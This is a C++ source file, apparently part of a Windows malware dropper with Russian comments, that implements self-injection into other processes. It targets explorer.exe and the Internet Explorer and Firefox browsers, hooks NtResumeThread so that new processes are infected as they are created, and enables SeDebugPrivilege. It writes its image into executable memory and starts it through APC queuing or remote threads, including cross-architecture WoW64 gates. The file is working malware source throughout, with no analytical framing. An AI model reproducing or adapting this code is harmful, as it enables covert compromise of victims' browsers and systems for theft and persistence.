#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <TlHelp32.h>

#include "dropper.h"
#include "inject.h"


#include "utils.h"
#include "seccfg.h"
#include "peldr.h"
#include "x64utils.h"
#include "config.h"

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Inject::CheckProcessName(HANDLE ProcessHandle)
{
	CHAR ProcessName[MAX_PATH] = {0};

	if (GetProcessImageFileName(ProcessHandle, ProcessName, RTL_NUMBER_OF(ProcessName)))
	{
		PCHAR pName = PathFindFileName(ProcessName);
		CHAR InjectBuffer[1024] = {0};

		if (Config::ReadString(CFG_DCT_INJECT_SECTION, pName, InjectBuffer, RTL_NUMBER_OF(InjectBuffer)) ||
			Config::ReadString(CFG_DCT_INJECT_SECTION, "*", InjectBuffer, RTL_NUMBER_OF(InjectBuffer)) ||
		!_stricmp(pName, "explorer.exe") || !_stricmp(pName, "iexplore.exe") || !_stricmp(pName, "firefox.exe") || !_stricmp(pName, "mozilla.exe"))
		{
			DbgMsg(__FUNCTION__"(): CheckProcessName '%s' ok\r\n", pName);

			return TRUE;
		}
	}

	return FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DRPEXPORT VOID InjectNormalRoutine(PVOID ImageBase)
{
	Inject::InjectRoutine(ImageBase, FALSE);

	RtlExitUserThread(STATUS_SUCCESS);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DRPEXPORT VOID InjectApcRoutine(PVOID ImageBase, PVOID SystemArgument1, PVOID SystemArgument2)
{
	Inject::InjectRoutine(ImageBase, TRUE);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

NTSTATUS NewZwResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount)
{
	Drop::CreateInjectStartThread();

	NTSTATUS St;
	THREAD_BASIC_INFORMATION ThreadBasicInfo;
	DWORD_PTR ReturnLength;

	St = NtQueryInformationThread(ThreadHandle, ThreadBasicInformation, (PVOID)&ThreadBasicInfo, sizeof(ThreadBasicInfo), &ReturnLength);
	if (NT_SUCCESS(St) && (DWORD)ThreadBasicInfo.ClientId.UniqueProcess != GetCurrentProcessId())
	{
		if (Inject::InjectProcess((DWORD)ThreadBasicInfo.ClientId.UniqueProcess, ThreadHandle))
		{
			DbgMsg(__FUNCTION__"(): InjectProcess started ok\r\n");
		}
	}
	return ZwResumeThread(ThreadHandle, PreviousSuspendCount);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Inject::SetCreateProcessHooks()
{
	HMODULE hModule = GetModuleHandle("kernelbase.dll");
	if (hModule) 
	{
		Utils::ReplaceIAT("ntdll.dll", "NtResumeThread", NewZwResumeThread, hModule);
		Utils::ReplaceIAT("ntdll.dll", "ZwResumeThread", NewZwResumeThread, hModule);
	}

	hModule = GetModuleHandle("kernel32.dll");

	Utils::ReplaceIAT("ntdll.dll", "NtResumeThread", NewZwResumeThread, hModule);
	Utils::ReplaceIAT("ntdll.dll", "ZwResumeThread", NewZwResumeThread, hModule);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Inject::InjectRoutine(PVOID ImageBase, BOOLEAN bAPC)
{
	if (PeLdr::PeProcessRelocs(ImageBase, (DWORD64)ImageBase - PeLdr::PeGetImageBase(ImageBase)) && PeLdr::PeProcessImport(ImageBase))
	{
		
		if (Utils::CreateCheckMutex(GetCurrentProcessId(), Drop::GetMachineGuid()))
		{
			GetModuleFileName(NULL, Drop::CurrentModulePath, RTL_NUMBER_OF(Drop::CurrentModulePath));
			Drop::CurrentImageBase = ImageBase;
			Drop::CurrentImageSize = PeLdr::PeImageNtHeader(ImageBase)->OptionalHeader.SizeOfImage;
			Drop::bFirstImageLoad = FALSE;
			Drop::bWorkThread = FALSE;

			// Если инжект через апц или через эксплоит то можно сразу создавать основной поток
			if (bAPC /*|| Exploit32::SetNotifyInjectEventRestoreAtan()*/) Drop::CreateInjectStartThread();

			// Если инжект через RtlCreateUserThread то поток создадим только через перехват
			SetCreateProcessHooks();
		}
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Inject::CopyImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD ImageSize, DWORD64 *RemoteImage)
{
	BOOLEAN Result = FALSE;
	PVOID RelocImage;

#ifndef _WIN64
	// Если мы 32 а таргет 64 аллокаем память через гейт
	if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
	{
		*RemoteImage = NULL;
		NTSTATUS St = x64Utils::x64NtAllocateVirtualMemory(ProcessHandle, RemoteImage, ImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(St))
		{
			DbgMsg(__FUNCTION__"(): x64ZwAllocateVirtualMemory failed: %08X\r\n", St);
		}
	}
	// Если мы 64 а таргет 64/32, или мы 32 и таргет 32 аллокам просто 
	else
#endif
	{
		*RemoteImage = (DWORD64)VirtualAllocEx(ProcessHandle, NULL, ImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!*RemoteImage)
		{
			DbgMsg(__FUNCTION__"(): VirtualAllocEx failed: %08X\r\n", GetLastError());
		}
	}

	if (*RemoteImage)
	{
		RelocImage = malloc(ImageSize);
		if (RelocImage)
		{
			CopyMemory(RelocImage, ImageBase, ImageSize);

			if (PeLdr::PeProcessRelocs(RelocImage, (DWORD64)PeLdr::PeGetImageBase(ImageBase) - (DWORD64)ImageBase))
			{
#ifndef _WIN64
				// Если мы 32 а таргет 64 пишем память через гейт
				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
				{
					NTSTATUS St = x64Utils::x64NtWriteVirtualMemory(ProcessHandle, *RemoteImage, (DWORD64)RelocImage, ImageSize);
					Result = NT_SUCCESS(St);
					if (!Result)
					{
						DbgMsg(__FUNCTION__"(): x64ZwWriteVirtualMemory failed: %08X\r\n", St);
					}
				}
				// Если мы 64 а таргет 64/32, или мы 32 и таргет 32 пишем просто 
				else
#endif
				{
					Result = WriteProcessMemory(ProcessHandle, (LPVOID)*RemoteImage, RelocImage, ImageSize, NULL);
					if (!Result)
					{
						DbgMsg(__FUNCTION__"(): WriteProcessMemory failed: %08X\r\n", GetLastError());
					}
				}
			}

			free(RelocImage);
		}
	}
	
	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD ImageSize, HANDLE ThreadHandle)
{
	NTSTATUS St;
	BOOLEAN Result = FALSE;
	DWORD64 RemoteImage;
	DWORD64 StartRoutine;

	if (CopyImageToProcess(ProcessHandle, ImageBase, ImageSize, &RemoteImage))
	{
		StartRoutine = (DWORD64)PeLdr::PeGetProcAddress(ImageBase, ThreadHandle ? "InjectApcRoutine" : "InjectNormalRoutine", TRUE);
		if (StartRoutine)
		{
			StartRoutine = RemoteImage + (DWORD_PTR)StartRoutine;
			// Если есть поток вставляем апц (инжект в новый процесс)
			if (ThreadHandle)
			{
#ifndef _WIN64
				// Если мы 32
				if (Utils::IsWow64(NtCurrentProcess()))
				{
					// A таргет 64 вставляем апц через гейт
					if (!Utils::IsWow64(ProcessHandle))
					{
						St = x64Utils::x64NtQueueApcThread(ThreadHandle, StartRoutine, RemoteImage);
						if (NT_SUCCESS(St))
						{
							Result = TRUE;
						}
						else
						{
							DbgMsg(__FUNCTION__"(): x64NtQueueApcThread failed: %08X\r\n", St);
						}
					}
					// А таргет 32 вставляем просто
					else
					{
						St = NtQueueApcThread(ThreadHandle, (PVOID)StartRoutine, (PVOID)RemoteImage, NULL, NULL);
						if (NT_SUCCESS(St))
						{
							Result = TRUE;
						}
						else
						{
							DbgMsg(__FUNCTION__"(): NtQueueApcThread failed: %08X\r\n", St);
						}
					}
				}
				// Если мы 64
				else
#endif
				{
#ifdef _WIN64
					// А таргет 32 вставляем апц через вов64 враппер
					if (Utils::IsWow64(ProcessHandle))
					{
						St = RtlQueueApcWow64Thread(ThreadHandle, (PVOID)StartRoutine, (PVOID)RemoteImage, NULL, NULL);
						if (NT_SUCCESS(St))
						{
							Result = TRUE;
						}
						else
						{
							DbgMsg(__FUNCTION__"(): RtlQueueApcWow64Thread failed: %08X\r\n", St);
						}
					}
					// А таргет 64 вставляем просто
					else
#endif
					{
						St = NtQueueApcThread(ThreadHandle, (PVOID)StartRoutine, (PVOID)RemoteImage, NULL, NULL);
						if (NT_SUCCESS(St))
						{
							Result = TRUE;
						}
						else
						{
							DbgMsg(__FUNCTION__"(): NtQueueApcThread failed: %08X\r\n", St);
						}
					}
				}
			}
#ifndef _WIN64
			// Если нету потока создаем (инжект в существующий процесс)
			else
			{
				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
				{
					St = x64Utils::x64RtlCreateUserThread(ProcessHandle, StartRoutine, RemoteImage, &ThreadHandle);
					if (NT_SUCCESS(St))
					{
						Result = TRUE;

						CloseHandle(ThreadHandle);
					}
					else
					{
						DbgMsg(__FUNCTION__"(): x64RtlCreateUserThread failed: %08X\r\n", St);
					}
				}
				else
				{
					ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)StartRoutine, (PVOID)RemoteImage, 0, NULL);
					if (ThreadHandle)
					{
						Result = TRUE;

						CloseHandle(ThreadHandle);	
					}
					else
					{
						DbgMsg(__FUNCTION__"(): CreateRemoteThread failed: %08X\r\n", GetLastError());
					}
				}
			}
#endif
		}
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Inject::InjectProcess(DWORD ProcessId, HANDLE ThreadHandle)
{   
	BOOLEAN Result = FALSE;
	HANDLE ProcessHandle;
	PVOID ImageBase;
	DWORD ImageSize;

	// Если процесс не инжекчен
	if (Utils::CheckMutex(ProcessId, Drop::GetMachineGuid()))
	{
		ProcessHandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_CREATE_THREAD, FALSE, ProcessId);
		if (!ProcessHandle)
		{
			Utils::SetPrivilege("SeDebugPrivilege", TRUE);
			ProcessHandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_CREATE_THREAD, FALSE, ProcessId);
		}
		if (ProcessHandle)
		{
			// Проверяем имя процесса
			if (CheckProcessName(ProcessHandle))
			{
#ifdef _WIN64
				// Если мы 64 а трагет процесс 32, конвертируем себя в 32 и инжектим
				if (Utils::IsWow64(ProcessHandle))
#else
				// Если мы 32 а а тарегт процесс 64, конвертируем себя в 64 и инжектим
				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
#endif
				{
					// Конвертируем себя из 32 в 64 либо из 64 в 32, если первый запуск и инжект (32 в 64) нужно прогрузить секции 64 по вирутальным адресам
					if (SecCfg::GetImageFromImage(Drop::CurrentImageBase, &ImageBase, &ImageSize, Drop::bFirstImageLoad))
					{
						Result = InjectImageToProcess(ProcessHandle, ImageBase, ImageSize, ThreadHandle);

						VirtualFree(ImageBase, 0, MEM_RELEASE);
					}
				}
				// Если мы 64 и таргет 64 или мы 32 и таргет 32 инжектим себя
				else
				{
					Result = InjectImageToProcess(ProcessHandle, Drop::CurrentImageBase, Drop::CurrentImageSize, ThreadHandle);
				}
			}

			CloseHandle(ProcessHandle);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): OpenProcess failed: %08X\r\n", GetLastError());
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): Process already injected\r\n");
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Inject::InjectProcessByName(LPSTR ProcessName)
{
	DWORD Processes[10];
	DWORD Count = Utils::GetProcessIdByName(ProcessName, Processes, RTL_NUMBER_OF(Processes));
	for (DWORD i = 0; i < Count; i++)
	{
		if (InjectProcess(Processes[i], 0))
		{
			DbgMsg(__FUNCTION__"(): Inject to '%S' ok\r\n", ProcessName);

			return TRUE;
		}
	}

	return FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
